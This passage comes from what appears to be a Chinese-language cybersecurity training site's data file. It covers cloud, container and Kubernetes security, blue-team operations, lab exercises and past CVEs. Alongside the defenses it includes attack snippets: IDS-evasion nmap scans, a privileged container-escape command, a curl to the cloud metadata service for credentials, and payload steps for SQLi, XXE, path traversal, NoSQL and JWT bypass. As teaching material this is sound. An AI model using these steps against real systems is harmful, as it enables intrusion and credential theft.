            "初级": "思路：分片或异常包（IDS 重组与主机不一致）；低速慢速扫描避开阈值；加密隧道（VPN/TLS）隐藏内容；利用允许的业务端口（80/443）隧道化。WAF：编码或分块绕过规则。",
            "中级": "实战：用 nmap 时序参数（-T1/-T2）慢扫；对 WAF 做编码/注释/大小写混淆；借 CDN 或合法域名做 C2 反连。防御：全流量深度检测、行为基线、内网东西向也布防（不只在边界）。",
            "高级": "深入：协议语义差异导致的检测绕过、加密流量中的元数据泄露（SNI/证书）、以及绕过与误报治理的平衡。强调：边界防护不是银弹，纵深防御（边界 + 主机 + 行为）才是关键。"
          },
          codeLang: "bash",
          code:
`# 慢速扫描规避阈值（授权）
nmap -T2 -sS --max-rate 10 target.com
# WAF 绕过示意：编码/分块使规则失配（仍走合法协议）
# 防御：全流量镜像 + 行为分析 + 内网微隔离`,
          tool: "Nmap 时序、WAFw00f、ModSecurity 规则分析",
          refs: "IDS/IPS 规避技术；纵深防御架构"
        }
      ]
    },
    /* ---------------- 云原生与容器安全 ---------------- */
    {
      id: "cloud", name: "云原生与容器安全", icon: "☁️",
      desc: "覆盖云安全责任共担、IAM、容器逃逸、Kubernetes、Serverless 与元数据防护，适配现代上云架构。",
      topics: [
        {
          id: "shared-resp", name: "云安全责任共担", level: "入门",
          summary: "明确云厂商与客户各自的安全边界，避免「以为是厂商管」的盲区。",
          keywords: ["责任共担","shared responsibility","云安全","客户责任","厂商责任","合规"],
          levels: {
            "入门": "用云就像租大楼：物业（云厂商）管大楼结构和公共区域，你租的房间里面怎么锁门、放什么，得自己负责。搞清边界才不会留漏洞。",
            "初级": "通用模型：厂商负责云本身（硬件、虚拟化、网络基础设施、托管服务的安全）；客户负责云里的内容（身份与访问、数据、操作系统补丁、配置、应用）。IaaS/PaaS/SaaS 边界逐层上移。误解常导致配置暴露。",
            "中级": "实战：核对所用服务的共担矩阵；重点自查客户侧配置（存储桶公开、密钥泄露、过度授权）；把责任边界写进安全检查清单。常见事故：公开 S3/OSS 桶、误配安全组放通 0.0.0.0/0。",
            "高级": "深入：托管服务（如托管数据库）的责任切分细节、多租户隔离假设、以及合规映射（等保/ISO 对共担的要求）。强调：共担不是甩锅，客户侧配置错误是云上绝大多数泄露的根因。"
          },
          codeLang: "text",
          code:
`# 共担速记（AWS/Azure/阿里云 通用）
# 厂商负责：物理、Hypervisor、网络基础设施、托管服务安全
# 客户负责：IAM、数据加密与密钥、OS 补丁、网络安全组、应用
# 自查清单：存储桶权限、安全组 0.0.0.0/0、密钥硬编码、过度授权`,
          tool: "各云共担责任白皮书、配置基线扫描器",
          refs: "AWS/Azure/GCP 共担模型；CSA 云控制矩阵"
        },
        {
          id: "iam", name: "IAM 与最小权限", level: "初级",
          summary: "云身份与访问管理的配置错误是云上入侵的首要入口。",
          keywords: ["iam","最小权限","角色","策略","凭证","ak/sk","权限提升","云身份"],
          levels: {
            "入门": "云里每个程序、每个人都有一个身份和对应的能做什么的清单。清单给太宽（比如能删库），一旦钥匙泄露后果严重。",
            "初级": "要点：用户/角色/策略的区分；AK/SK（访问密钥）长期有效且易泄露；过度授权（*.*）埋雷；权限提升路径（被忽略的 PassRole/AssumeRole）。原则：默认无权限、按需授予、定期回收。",
            "中级": "实战：用云原生 Access Analyzer 找对外暴露的角色；审计策略是否含通配与敏感 Action；用临时凭证（STS）替代长期 AK；启用 MFA 与密钥轮转。防御：策略最小化 + 访问分析 + 审计日志。",
            "高级": "深入：跨账号信任与角色链、权限策略与边界（Permissions Boundary）的博弈、以及一个被忽略的策略如何串成完整提权。强调：IAM 是云上安全的命门，最小权限 + 持续审计胜过任何边界设备。"
          },
          codeLang: "json",
          code:
`// ❌ 危险：通配授权，拿到 AK 即失控
{ "Effect": "Allow", "Action": "*", "Resource": "*" }

// ✅ 安全：最小权限 + 条件（仅来源 IP + 需 MFA）
{ "Effect": "Allow", "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::app-bucket/*",
  "Condition": { "Bool": { "aws:MultiFactorAuthPresent": "true" } } }`,
          tool: "AWS IAM Access Analyzer、云审计工具",
          refs: "云厂商 IAM 最佳实践；CIS 云基准"
        },
        {
          id: "container-escape", name: "容器逃逸", level: "高级",
          summary: "利用容器运行时/内核缺陷或危险配置，突破隔离获得宿主机权限。",
          keywords: ["容器逃逸","docker escape","特权容器","挂载逃逸","runc","cve-2019-5736","kata"],
          levels: {
            "入门": "容器像轻量小房间，本应与外界隔离。如果配置不当或容器软件有漏洞，攻击者能从房间里破墙出来，控制整台宿主机。",
            "初级": "常见路径：特权容器（--privileged，可直接访问宿主设备）、挂载宿主文件系统（docker.sock 或 / 挂载）、危险 Capabilities、危险 syscalls、以及 runc/containerd 的漏洞（如 CVE-2019-5736）。",
            "中级": "实战：检查容器是否特权或挂载敏感目录；通过 docker.sock 创建新特权容器；利用 runc 漏洞改写宿主二进制。防御：非特权运行、降权 Capabilities、用 gVisor/Kata 等强隔离、禁止挂载 docker.sock。",
            "高级": "深入：内核漏洞在容器上下文的利用、eBPF 与可观测性的攻防、以及 K8s 中从单容器到控制平面的升级路径。强调：容器隔离依赖内核，配置错误比漏洞更常见，默认最小特权最关键。"
          },
          codeLang: "bash",
          code:
`# ❌ 危险：特权容器 + 挂载宿主，极易逃逸
docker run --privileged -v /:/host busybox

# ✅ 安全：非特权、只读根、降权能力
docker run --cap-drop=ALL --security-opt=no-new-privileges \
           --read-only myapp
# 强隔离可选：--runtime=kata 或 gVisor`,
          tool: "amicie（检测）、容器基线扫描（Trivy）、runc 补丁",
          refs: "CVE-2019-5736；CIS Docker 基线；CNCF 运行时安全"
        },
        {
          id: "k8s", name: "Kubernetes 安全", level: "高级",
          summary: "K8s 控制平面与 workload 的配置缺陷是云原生环境的主要风险。",
          keywords: ["kubernetes","k8s","rbac","secret","etcd","pod安全","admission","供应链"],
          levels: {
            "入门": "Kubernetes 是管理很多容器的总调度。它自身有一套权限和配置，配错了（比如谁都能管集群）就会被整体攻陷。",
            "初级": "风险点：RBAC 过宽（cluster-admin 泛滥）、Secret 明文或可被读、etcd 未鉴权、Pod 安全上下文缺失（跑 root）、准入控制缺失、Dashboard 暴露。攻击链：控 API Server → 调度恶意 Pod → 逃逸。",
            "中级": "实战：审计 RBAC（谁有 exec/create）；检查 Pod 是否非 root 加只读根；用 NetworkPolicy 做东西向隔离；镜像扫描加准入策略（OPA/Gatekeeper）。防御：最小 RBAC + Pod 安全准入 + 镜像签名。",
            "高级": "深入：etcd 被控即控集群、Workload 身份与云 IAM 联动、以及供应链（CI 注入镜像）到集群的完整链。强调：K8s 安全是配置即安全，默认不安全，必须显式加固每一层。"
          },
          codeLang: "yaml",
          code:
`# ✅ Pod 安全上下文（最小特权）
securityContext:
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities: { drop: ["ALL"] }
# ✅ NetworkPolicy 限制东西向流量（默认拒绝）`,
          tool: "kubectl 审计、Trivy、OPA/Gatekeeper、kube-hunter",
          refs: "CIS Kubernetes 基准；K8s 安全文档；NSA K8s 加固指南"
        },
        {
          id: "serverless", name: "Serverless 安全", level: "中级",
          summary: "函数即服务（FaaS）的新攻击面：事件注入、权限过大与第三方依赖。",
          keywords: ["serverless","faas","函数安全","事件注入","lambda","依赖","冷启动"],
          levels: {
            "入门": "Serverless 是写好函数、平台帮你跑的模式，没有固定服务器。但它也有自己的坑：函数被触发时收到的数据，如果没处理好，照样能出事。",
            "初级": "风险：事件或数据注入（函数把不可信输入当指令）、过度授权（一个函数有全账号权限）、第三方依赖含漏洞、以及函数间调用链信任过度。无服务器不等于无责任，配置与代码仍归你。",
            "中级": "实战：严格校验事件源与负载；每个函数最小 IAM 角色；锁定依赖版本加扫描；注意并发下的状态污染（函数本应无状态）。防御：最小权限 + 输入校验 + 依赖治理。",
            "高级": "深入：跨函数调用链的信任传递、Layers/环境变量中的密钥泄露、以及函数作为入口在整体架构里的边界。强调：Serverless 把攻击面从主机变成事件与权限，治理重心随之转移。"
          },
          codeLang: "json",
          code:
`// ❌ 危险：函数角色过宽 + 直接使用事件体当指令
{ "Effect":"Allow", "Action":"*", "Resource":"*" }
// 且：eval(event.body.command)

// ✅ 安全：每函数独立最小角色 + 校验事件结构
// 用 JSON Schema 校验 event，拒绝未知字段`,
          tool: "函数级 IAM、依赖扫描、事件校验库",
          refs: "OWASP Serverless Top 10；云厂商函数安全指南"
        },
        {
          id: "metadata", name: "云元数据与凭证泄露", level: "中级",
          summary: "实例元数据服务（IMDS）可被 SSRF 或误配读取，泄露临时凭证。",
          keywords: ["元数据","imds","169.254.169.254","临时凭证","ssrf","云凭证","instance metadata"],
          levels: {
            "入门": "云服务器内部有个悄悄告诉自己身份信息的接口。如果网站能被诱导去访问这个接口，就可能把临时钥匙交出去，攻击者据此控制云资源。",
            "初级": "IMDS（169.254.169.254）返回实例角色临时凭证与环境信息。风险来自：SSRF 打穿到元数据；IMDSv1 可被简单请求读取；应用把凭证写到前端或日志。后果：横向到云账号。",
            "中级": "实战：SSRF 请求 http://169.254.169.254/latest/meta-data/iam/security-credentials/；拿临时 AK 后操作目标云资源；检查是否 IMDSv2（需 token）。防御：强制 IMDSv2（带 hop-limit）、修复 SSRF、凭证不落前端。",
            "高级": "深入：IMDSv2 的防绕过（Token 不可外部获取）、元数据与实例角色链、以及云内 SSRF 控云在企业中的真实路径。强调：元数据是云上最危险的内部接口，必须用 IMDSv2 + 阻断 SSRF 双保险。"
          },
          codeLang: "bash",
          code:
`# ❌ 危险：SSRF 可读取实例临时凭证（IMDSv1）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role

# ✅ 防御：强制 IMDSv2（需会话 token，外部不可得）
aws ec2 modify-instance-metadata-options \
  --http-tokens required --http-put-response-hop-limit 1`,
          tool: "SSRF 测试、云配置审计",
          refs: "云厂商 IMDSv2 文档；Capitol One 事件复盘"
        }
      ]
    },
    /* ---------------- 蓝队·安全运营与应急 ---------------- */
    {
      id: "blue", name: "蓝队·安全运营与应急", icon: "🛡️",
      desc: "覆盖日志与 SIEM、入侵检测、流量分析、勒索应急、威胁情报与 EDR，是防守侧的核心能力。",
      topics: [
        {
          id: "siem", name: "安全日志与 SIEM", level: "初级",
          summary: "集中收集与关联多源日志，是检测与溯源的基础能力。",
          keywords: ["siem","日志","集中收集","关联规则","elk","splunk","溯源","日志分析"],
          levels: {
            "入门": "发生安全事件后，靠什么知道？靠平时记下的各种日志（谁登录、什么操作）。把分散的日志汇到一起分析，就能发现异常。",
            "初级": "SIEM（安全信息与事件管理）汇集防火墙、主机、应用、认证等日志，做归一化与关联规则。价值：发现孤立看不出的攻击链。常见平台：Splunk、ELK、Wazuh。要点：时间同步（NTP）、字段归一化、去重降噪。",
            "中级": "实战：定义关键规则（暴力破解、异常外联、特权使用）；用查询语言找 IOC 命中；建用例库覆盖 MITRE ATT&CK。防御价值：缩短发现时间（MTTD）。注意误报治理，否则告警疲劳。",
            "高级": "深入：UEBA（用户实体行为分析）异常基线、日志完整性与防篡改（WORM 存储）、以及检测工程作为持续迭代学科。强调：SIEM 效果 = 数据覆盖 × 规则质量 × 响应流程，缺一不可。"
          },
          codeLang: "spl",
          code:
`// 示例：检出短时间多次失败登录（暴力破解雏形）
index=auth fail
| stats count by user, src_ip
| where count > 10
// 配合：成功登录紧随其后则高危`,
          tool: "Splunk、ELK/OpenSearch、Wazuh",
          refs: "SIEM 部署指南；MITRE ATT&CK 数据源"
        },
        {
          id: "ids", name: "入侵检测 IDS/IPS", level: "中级",
          summary: "基于特征或异常识别入侵行为，并可选阻断。",
          keywords: ["ids","ips","入侵检测","snort","suricata","特征","异常","告警"],
          levels: {
            "入门": "在网里安排哨兵，盯着经过的流量，发现可疑的就报警（IDS），厉害的还能直接拦下（IPS）。",
            "初级": "两类：基于特征（已知攻击指纹，如 Snort/Suricata 规则）与基于异常（偏离基线）。IDS 只告警，IPS 串联可阻断。部署：镜像流量（SPAN/TAP）或串联。局限：特征库滞后、加密流量难检。",
            "中级": "实战：写或调 Suricata 规则覆盖高频攻击；结合威胁情报 IOC 做检测；处理误报（调阈值/白名单）。防御运营：告警分级 + 工单闭环。注意：加密流量需解密或靠端点侧补位。",
            "高级": "深入：规则与 ML 异常的结合、东西向（内部）流量的检测盲区、以及 IDS/IPS 在零信任架构中的定位。强调：检测不是终点，告警必须接响应流程，否则只是看见了。"
          },
          codeLang: "text",
          code:
`# Suricata 规则示意（检测明显扫描/已知 payload）
alert tcp any any -> $HOME_NET 80 (msg:"SQLi attempt"; \
  flow:to_server; content:"union select"; nocase; sid:10001;)
# 实战需结合情报 IOC 与去误报调优`,
          tool: "Suricata、Snort、Zeek",
          refs: "Suricata 文档；IDS/IPS 部署实践"
        },
        {
          id: "traffic", name: "恶意流量分析", level: "中级",
          summary: "在加密普及下，用元数据、行为与威胁情报识别 C2 与数据外传。",
          keywords: ["流量分析","恶意流量","c2","dns隧道","外联","威胁狩猎","netflow"],
          levels: {
            "入门": "即使内容加密了，流量本身的特征也会露馅：跟谁通信、频率、大小、时间点。分析这些能发现隐藏的恶意联系。",
            "初级": "思路：看异常外联（陌生 IP/域名）、信标（Beacon）规律心跳、DNS 隧道（超长或编码子域）、数据外传（突发大流量）。工具：Zeek 抽元数据、Suricata、Wireshark。结合威胁情报标注恶意 IOC。",
            "中级": "实战：从 NetFlow/Zeek conn.log 找长连接或周期信标；解码可疑 DNS 看是否隧道；用 JA3/JA4 指纹识别恶意工具（如 Cobalt Strike）。防御狩猎：基于假设主动找隐藏威胁。",
            "高级": "深入：加密流量中的侧信道（包长/间隔）、DGA 域名识别、以及威胁狩猎方法论（假设→验证→沉淀检测）。强调：流量分析的价值在行为与情报，单看一条难定罪。"
          },
          codeLang: "bash",
          code:
`# 用 Zeek 抽连接元数据，找可疑外联/信标
zeek -C -r capture.pcap
# 关注 conn.log：duration、orig/resp 字节、历史
# DNS 隧道线索：超长标签、高频子域、罕见 TLD`,
          tool: "Zeek、Wireshark、Suricata、JA3/JA4",
          refs: "Zeek 文档；威胁狩猎手册；MITRE ATT&CK 命令控制"
        },
        {
          id: "ir", name: "勒索软件应急响应", level: "高级",
          summary: "勒索事件发生后的隔离、遏制、溯源与恢复闭环流程。",
          keywords: ["应急响应","勒索软件","incident response","隔离","溯源","备份","业务连续性"],
          levels: {
            "入门": "电脑被勒索锁了怎么办？第一件事是断网防扩散，然后保住能保的，再按步骤恢复，而不是乱点付费。",
            "初级": "流程（NIST IR）：准备 → 检测分析 → 遏制（隔离受感染主机/断网/封账号）→ 根除（清恶意/改凭证）→ 恢复（从干净备份还原、验证）→ 复盘。关键：日常有离线或不可变备份，演练过恢复。",
            "中级": "实战：立即隔离（拔网/防火墙阻断，勿重启以免触发自毁）；取证留痕（内存/磁盘镜像）；定位入口与横向路径；统一改密加吊销凭据；从已验证备份重建。避免直接付赎金（不保证解密且助长犯罪）。",
            "高级": "深入：早期遏制与业务连续性的权衡、解密工具可用性评估（部分家族有免费解密器）、以及把单次事件转成检测规则与加固项。强调：应急响应的天花板由平时准备（备份/演练/可见性）决定。"
          },
          codeLang: "text",
          code:
`# 应急响应速记（按场景判断，勿死记步骤）
# 1) 遏制：隔离主机、封锁账号与 VPN、阻断 C2 IP
# 2) 取证：保留内存/磁盘镜像，记录时间线（勿重启）
# 3) 根除：清恶意载荷、统一改密、吊销令牌
# 4) 恢复：从离线/不可变备份还原，验证后再上线
# 5) 复盘：沉淀 IOC 与检测规则，补加固项`,
          tool: "备份系统、EDR 隔离、取证工具（如 Velociraptor）",
          refs: "NIST SP 800-61（事件响应）；勒索软件防护指南"
        },
        {
          id: "threat-intel", name: "威胁情报", level: "初级",
          summary: "用 IOC/IOA 与攻击者画像提升检测与决策质量。",
          keywords: ["威胁情报","threat intelligence","ioc","ioa","ttp","情报源","tip","态势"],
          levels: {
            "入门": "与其临时找坏人特征，不如订阅已知坏蛋名单（恶意 IP/域名/文件指纹），让系统自动比对报警。",
            "初级": "两类：IOC（失陷指标，如 IP/域名/哈希，用于已发生匹配）与 IOA（攻击行为或意图，用于正在发生判断）。TTP 描述攻击者手法（对应 ATT&CK）。来源：公开 feed、厂商、行业共享（ISAC）。",
            "中级": "实战：把情报接入 SIEM/防火墙做自动阻断；按相关性过滤降噪（地域/行业）；用 ATT&CK 映射对手能力做差距分析。平台：TIP（威胁情报平台）做汇聚与分发。",
            "高级": "深入：情报的置信度与误报成本、私有情报（自家发现的 IOC）沉淀、以及情报驱动的狩猎。强调：情报价值不在多，在可用、相关、接了响应。"
          },
          codeLang: "json",
          code:
`// 情报格式示意（STIX/TAXII 思想，简化）
{
  "type": "indicator",
  "pattern": "[ipv4-addr:value = '203.0.113.66']",
  "valid_until": "2026-09-01",
  "labels": ["malicious-activity"]
}
// 接入 SIEM：命中即告警/阻断`,
          tool: "MISP、OpenCTI、TAXII 订阅",
          refs: "STIX/TAXII 标准；MITRE ATT&CK；威胁情报实践"
        },
        {
          id: "edr", name: "终端检测与响应 EDR", level: "初级",
          summary: "在主机侧做行为检测、取证与一键响应，是端点防护的核心。",
          keywords: ["edr","终端检测","端点","行为检测","取证","隔离","响应","xdr"],
          levels: {
            "入门": "服务器和电脑这类端点是攻击者最终落脚处。在端点装监控加反应工具，能看见进程干了啥，并远程隔离它。",
            "初级": "EDR 与老杀毒区别：不只看文件特征，更看行为（进程链、注入、异常父子关系），并支持回溯取证与远程响应（隔离主机、终止进程、采集内存）。价值：在勒索或无文件攻击中尤其关键。",
            "中级": "实战（蓝队）：用 EDR 拉进程树定位入口；一键隔离受染主机遏制；用时间线还原攻击链；把发现的 IOC 反哺情报与检测。选型关注：行为覆盖、误报率、响应闭环。",
            "高级": "深入：EDR 自身被对抗（卸载/篡改/驱动漏洞）、与 XDR（跨终端+网络+云）的协同、以及可见性到检测到响应的自动化（SOAR）。强调：端点是攻防最后一道线，可见性与一键响应决定止损速度。"
          },
          codeLang: "text",
          code:
`# EDR 典型响应动作（平台内操作，非命令）
# 隔离主机：断开网络但保留管理通道
# 终止进程树：杀掉恶意父+子进程
# 采集：内存镜像 + 进程树 + 网络连接快照
# 反哺：导出 IOC 进 SIEM/情报平台`,
          tool: "CrowdStrike / SentinelOne / 火绒/360 企业版 等 EDR",
          refs: "EDR 能力框架；MITRE ATT&CK 端点技术"
        }
      ]
    }
  ],

  /* ---------------- 实战靶场 ---------------- */
  ranges: [
    { id:"r_sqli", cat:"web", level:"初级", title:"基础 SQL 注入（Union 回显）",
      summary:"在授权 DVWA/本地靶机中，利用 Union 注入提取数据库版本与用户表。",
      setup:"本地部署 DVWA（Security=Low）或 PortSwigger SQLi lab。请勿对未授权站点测试。",
      steps:["用单引号探测报错，确认注入点","用 ORDER BY 判断列数","用 UNION SELECT 定位回显列","读取 version()/user()/database()","枚举 information_schema 取出管理员表"],
      writeup:"核心是把用户输入当数据而非指令。低安全级别下未使用预处理，单引号闭合后插入 union 即可回显。实战中应先尝试参数化查询确认是否修复。",
      defense:"使用预处理语句（占位符），并对数据库账号做最小权限与库名隔离。"},
    { id:"r_xss", cat:"web", level:"初级", title:"存储型 XSS 与 Cookie 窃取（防御视角）",
      summary:"理解存储型 XSS 触发链路，并演示正确的输出编码与 CSP 防护。",
      setup:"本地 DVWA 留言板（Security=Low）。仅用于理解原理，不实际窃取他人凭证。",
      steps:["在留言内容注入 <script> 弹窗验证触发点","观察存储后在他人页面自动执行","改用 textContent/输出编码使脚本失效","加 CSP 头进一步限制内联脚本"],
      writeup:"存储型 XSS 危害最大，因为持久化且影响所有访问者。修复必须在「输出到 HTML 上下文时编码」，而非仅过滤输入。CSP 是纵深防御。",
      defense:"输出编码 + HttpOnly Cookie + CSP；框架默认转义，慎用 dangerouslySetInnerHTML。"},
    { id:"r_cmd", cat:"web", level:"中级", title:"命令注入盲打（带外验证）",
      summary:"当无回显时，用 DNS/HTTP 带外通道确认命令是否执行。",
      setup:"本地存在 os.system 拼接的漏洞页面（自建教学环境）。",
      steps:["构造 ; ping 测试延迟判断执行","用 curl/busybox 向自有监听服务发请求（OOB）","确认命令上下文与权限","改用参数数组重构代码"],
      writeup:"盲命令注入靠副作用（时间、网络）判断。OOB 需自有可控的监听域名/服务，切勿指向他人主机。",
      defense:"避免调用 shell；使用参数数组；对确需 shell 的场景用 shlex.quote 严格转义。"},
    { id:"r_stack", cat:"binary", level:"入门", title:"经典栈溢出（关闭保护练习）",
      summary:"在 -fno-stack-protector -z execstack 编译的练习程序上理解溢出原理。",
      setup:"本地 C 练习程序 + pwntools + gdb/pwndbg。编译时显式关闭保护以教学。",
      steps:["用 Cyclic 确定返回地址偏移","构造 padding + 跳转到 shellcode/后门函数","用 gdb 观察栈布局","开启 canary/NX 后讨论绕过思路"],
      writeup:"栈溢出是理解所有内存破坏的起点。现代默认开启保护，真实利用需 ROP/泄漏，本练习仅演示原理。",
      defense:"开启栈保护(-fstack-protector)、NX、PIE、ASLR；用安全函数替代危险 API。"},
    { id:"r_rop", cat:"binary", level:"高级", title:"ret2libc 绕过 NX/ASLR",
      summary:"泄漏 libc 地址并调用 system('/bin/sh') 构造稳定利用链。",
      setup:"开启 NX+ASLR 的练习二进制 + 已知版本 libc。",
      steps:["利用漏洞泄漏 puts/GOT 真实地址","通过 libc-database 定位版本","计算 system 与 /bin/sh 偏移","拼出 ROP 链获取 shell（注意栈对齐）"],
      writeup:"ret2libc 是 NX 环境下最经典的利用。关键在「先泄漏再计算」，且需匹配目标 libc 版本。",
      defense:"Full RELRO + PIE + ASLR + 编译期 CFI；及时更新 libc。"},
    { id:"r_rsa", cat:"crypto", level:"中级", title:"RSA 低指数/共模攻击",
      summary:"理解 RSA 实现中的常见数学陷阱（仅用已知教学参数）。",
      setup:"已知 n、e、c 的教学题目（使用小参数，禁止用于真实系统）。",
      steps:["识别 e 过小或同 n 多 m 广播场景","用中国剩余定理解广播攻击","或用费马分解处理 p,q 相近","确认 OAEP 填充可彻底规避此类问题"],
      writeup:"RSA 的安全依赖正确实现。低指数、共模、弱随机都会摧毁理论安全性。务必使用库的标准 OAEP 流程。",
      defense:"e=65537、足够随机素数、OAEP 填充、2048 位以上密钥。"},
    { id:"r_hash", cat:"crypto", level:"初级", title:"哈希长度扩展攻击（理解）",
      summary:"演示在 hash(secret||msg) 结构下的长度扩展，强调 HMAC 的必要性。",
      setup:"使用 SHA-256 且 hash(secret+data) 的服务（教学环境）。",
      steps:["理解 Merkle–Damgård 可追加状态","在不知 secret 时构造合法扩展消息","验证服务端接受伪造 MAC","改用 HMAC 后攻击失效"],
      writeup:"长度扩展说明「自创 MAC 结构」不可靠。消息认证必须用 HMAC/带密钥的 AEAD。",
      defense:"使用 HMAC-SHA256 或 AES-GCM，绝不自行拼接 secret 做 MAC。"},
    { id:"r_recon", cat:"pentest", level:"入门", title:"授权资产侦察演练",
      summary:"在书面授权范围内完成子域名发现、端口扫描与资产梳理。",
      setup:"对【你拥有或已获书面授权】的域名/范围进行，记录全部动作与时间。",
      steps:["被动收集：证书透明度、WHOIS、OSINT","主动：Nmap 端口/版本、目录爆破","整理资产与暴露面清单","标注需进一步验证的高危端口"],
      writeup:"侦察是一切的前提，也最易被滥用。纪律：严格限定授权范围、留存授权证明、不扫描范围外资产。",
      defense:"收敛暴露面、关闭无用端口、启用 WAF/CDN、定期资产测绘。"},
    { id:"r_priv", cat:"pentest", level:"中级", title:"Linux 提权路径（授权主机）",
      summary:"在已授权的测试主机上用 PEAS 枚举并复现一条提权路径。",
      setup:"你拥有合法权限的测试虚拟机（如本地 VulnHub 镜像）。",
      steps:["运行 LinPEAS 收集线索","检查 sudo -l / SUID / cron 配置弱点","复现提权并截图留证","给出最小权限与补丁修复建议"],
      writeup:"提权多数来自配置错误而非 0day。修复以最小权限与及时补丁为主。",
      defense:"最小权限账号、审计 sudoers、及时更新内核、加固 cron。"},
    { id:"r_xxe", cat:"web", level:"中级", title:"XXE 文件读取（授权靶机）",
      summary:"在授权靶机/PortSwigger XXE lab 中，利用外部实体读取服务器本地文件。",
      setup:"本地部署含 XML 解析的老接口（如旧 SOAP 练习服务）或 PortSwigger XXE lab。",
      steps:["提交含 <!ENTITY> 的恶意 XML 探测报错","读取 /etc/passwd 验证外部实体开启","尝试 blind XXE 参数实体带外","修复：禁用 DOCTYPE 与外部实体后复测"],
      writeup:"根因是 XML 解析器开启了外部实体解析。现代框架默认关闭，但遗留 XML 处理仍是重灾区。",
      defense:"禁用 DTD/外部实体（LIBXML_NONET）、用 JSON 替代 XML、对确需 XML 用安全解析器。"},
    { id:"r_jwt", cat:"web", level:"中级", title:"JWT 算法混淆/弱密钥（授权靶机）",
      summary:"在授权靶机中，利用 alg=none 或 RS→HS 混淆或弱密钥伪造管理员令牌。",
      setup:"本地存在 JWT 校验且算法可由客户端控制的练习接口。",
      steps:["解码令牌确认结构与算法","尝试 alg=none 或把 RS256 当 HS256 用公钥签","弱密钥用 hashcat 跑 rockyou 爆破","修复：固定算法白名单 + 强密钥后复测"],
      writeup:"JWT 安全依赖「签名验证不可绕过 + 密钥不可预测」。算法由客户端控制是典型实现错误。",
      defense:"服务端固定 algorithms 白名单、用强随机密钥、校验 aud/exp/nonce。"},
    { id:"r_traversal", cat:"web", level:"初级", title:"目录遍历读敏感文件（授权靶机）",
      summary:"在授权靶机中，利用 ../ 跳出基目录读取系统文件。",
      setup:"本地存在把文件名拼进路径的下载/读取接口（自建教学环境）。",
      steps:["用 ../../../../etc/passwd 逐级跳出","确认可读取系统文件","尝试编码绕过（..%2f、双写）","修复：白名单文件名 + 规范化前缀校验后复测"],
      writeup:"根因是路径拼接未规范化也未限基目录。防御必须在「输出真实路径」前校验落在允许目录内。",
      defense:"白名单文件名、用路径库函数规范化后校验前缀、禁止用户控制目录部分。"},
    { id:"r_nosql", cat:"web", level:"初级", title:"NoSQL 注入登录绕过（授权靶机）",
      summary:"在授权靶机中，向 MongoDB 查询注入 $ne / || 让登录条件恒真。",
      setup:"本地存在用对象做查询的登录接口（如 Express + Mongoose 误用）。",
      steps:["用户名填 { \"$ne\": \"\" } 观察绕过","尝试 ' || '1'=='1","确认以 admin 登录","修复：严格类型 + 拒绝 $ 运算符后复测"],
      writeup:"根因是用户可控输入被当作查询对象/运算符。与 SQL 注入同属「数据与指令未分离」。",
      defense:"用严格类型参数、拒绝以 $ 开头的字段、对输入做结构白名单校验。"},
    { id:"r_oauth", cat:"pentest", level:"中级", title:"OAuth redirect_uri 劫持（授权演练）",
      summary:"在授权演练环境中，利用 redirect_uri 校验不严把授权码导流到攻击者站点。",
      setup:"你拥有合法权限的演练应用或本地搭建的 OAuth 授权码流程。",
      steps:["找到一个开放重定向或子路径宽松的 redirect_uri","构造恶意 redirect_uri 骗取授权码","用授权码换 token（演示危害，不实际窃取）","修复：精确白名单 redirect_uri + PKCE 后复测"],
      writeup:"OAuth 安全取决于正确实现：redirect_uri 精确匹配、PKCE、state 防 CSRF、token 单次使用。",
      defense:"精确白名单 redirect_uri、强制 PKCE、校验 state/nonce、短期且绑定的 token。"}
  ],

  /* ---------------- 安全资讯（已公开、已修复历史漏洞，防御视角） ---------------- */
  news: [
    { id:"n_log4j", title:"Log4Shell（CVE-2021-44228）", cve:"CVE-2021-44228", date:"2021-12", cat:"web",
      summary:"Apache Log4j2 的 JNDI 查找允许远程加载恶意类，影响范围极广。",
      defense:"升级到 2.17.0+；禁用 JNDI 查找；通过 WAF 拦截 ${jndi}；进行资产盘点与版本排查。这是「依赖供应链」风险的标志性事件。"},
    { id:"n_spring", title:"Spring4Shell（CVE-2022-22965）", cve:"CVE-2022-22965", date:"2022-03", cat:"web",
      summary:"Spring Framework 在特定部署下可通过数据绑定实现 RCE。",
      defense:"升级 Spring 至安全版本；避免将应用部署为 WAR 于 Tomcat 默认配置；对数据绑定做类型白名单。"},
    { id:"n_heartbleed", title:"Heartbleed（CVE-2014-0160）", cve:"CVE-2014-0160", date:"2014-04", cat:"web",
      summary:"OpenSSL 心跳扩展越界读，可泄漏内存中的私钥与凭证。",
      defense:"升级 OpenSSL、轮换受影响证书与密钥；启用内存安全边界检查。启示：边界检查缺失会直接威胁信任根。"},
    { id:"n_eternalblue", title:"EternalBlue（MS17-010）", cve:"MS17-010", date:"2017-05", cat:"pentest",
      summary:"Windows SMBv1 远程代码执行漏洞，曾被勒索软件大规模利用。",
      defense:"禁用 SMBv1、及时打补丁、网络分段与 EDR 监测；不要暴露 445 端口到公网。"},
    { id:"n_bluekeep", title:"BlueKeep（CVE-2019-0708）", cve:"CVE-2019-0708", date:"2019-05", cat:"pentest",
      summary:"远程桌面服务预认证 RCE，无需用户交互即可被利用。",
      defense:"为 RDP 启用 NLA、及时补丁、限制 RDP 暴露、使用 VPN/堡垒机接入。"},
    { id:"n_spectre", title:"Spectre / Meltdown 系列", cve:"CVE-2017-5753 等", date:"2018-01", cat:"binary",
      summary:"CPU 推测执行侧信道可跨进程泄露内存，属硬件层面根本性问题。",
      defense:"更新内核/微码、启用站点隔离、关注浏览器缓解；理解「信任边界延伸到硬件」。"},
    { id:"n_proxlogon", title:"ProxyLogon（CVE-2021-26855）", cve:"CVE-2021-26855", date:"2021-03", cat:"web",
      summary:"Exchange Server 预认证 SSRF + 任意文件写，可接管邮件服务器并落地 webshell。",
      defense:"升级 Exchange 至官方补丁、限制 ECP/OWA 暴露、启用 AMSI、定期排查异常虚拟目录与 webshell。"},
    { id:"n_zologon", title:"Zerologon（CVE-2020-1472）", cve:"CVE-2020-1472", date:"2020-08", cat:"pentest",
      summary:"Netlogon 远程协议认证缺陷，可将域控机器账户密码置空，进而夺取域控。",
      defense:"及时打补丁、强制 Netlogon 安全通道、监控域控机器账户异常重置（事件 4742/5805）。"},
